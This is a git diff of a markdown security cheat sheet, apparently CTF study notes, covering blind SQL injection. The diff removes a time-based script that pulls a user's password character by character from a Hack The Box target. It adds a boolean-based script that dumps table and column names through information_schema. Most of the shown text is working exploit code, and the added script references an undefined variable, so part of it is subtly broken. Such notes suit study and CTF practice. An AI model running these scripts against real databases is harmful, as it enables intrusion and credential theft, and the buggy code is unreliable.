@@ -32,33 +32,50 @@ SELECT column_name(s) FROM table2 -> clause 2
 - base on response as like as error, timeout to collect data
 example:
 ```
-import requests, string, time
-arr = "_}"+ string.digits+ string.ascii_letters  + string.punctuation
+import requests, string
+
+characters = string.printable
 s = requests.session()
-url = 'http://188.166.173.208:30042/api/list'
 
-def bind(step):
-    for char in arr:
-        a = time.time()
-        s.post(url,data={'order':f"(select case when (select ascii(mid((select password from users  where username='flagholder'),{step},1))) LIKE {ord(char)} then sleep(0.6) else 1 end)"})
-        b = time.time()
-        if b-a > 4:
-            return char
-    return None        
+target = "http://0.0.0.0/api/sqliBlind"
 
-def flag():
-    flag = 'HTB{'
-    step = len(flag) + 1 
-    while True:
-        c = bind(step)
-        if c==None or c=='}':
-            return flag + c
-            
-        flag += c 
-        step += 1
-        print('[+] flag = ',flag)
+def get_one_char(payload):
+    for c in characters:
+        response = s.post(target,json = {
+            'username' : f"a' or ({payload})={ord(c)}  -- -",
+            'password' : 'foo'
+            }).json()
+        if response['data'] == True:
+            return c
+    return None
 
-print('[+] flag = ',flag())
+def dump_tables():
+    tables = ""
+    payload = "select ascii(mid(group_concat(table_name),{index},1)) from information_schema.tables where table_schema=database()"
+    index = 1
+    c = get_one_char(payload.format(index=index))
+    while c != None:
+        tables, index = table + c , index + 1
+        print('[+] table = ',tables)
+        c = get_one_char(payload.format(index=index))
+    return tables
+
+def dump_columns(table_name):
+    columns = ""
+    payload = "select ascii(mid(group_concat(column_name),{index},1)) from information_schema.columns where table_name='%s'"%(table_name)
+    index = 1
+    c = get_one_char(payload.format(index=index))
+    while c != None:
+        columns, index = columns + c, index + 1 
+        c = get_one_char(payload.format(index=index))
+    return columns
+
+table = dump_tables()
+
+print('\n-----------\n[*] tables found: ', table)
+
+for t in table.split(','):
+    print(f'[*] columns of {t} found: ',dump_columns(t))
 ```
 
 ### 2.3. Nosql injection
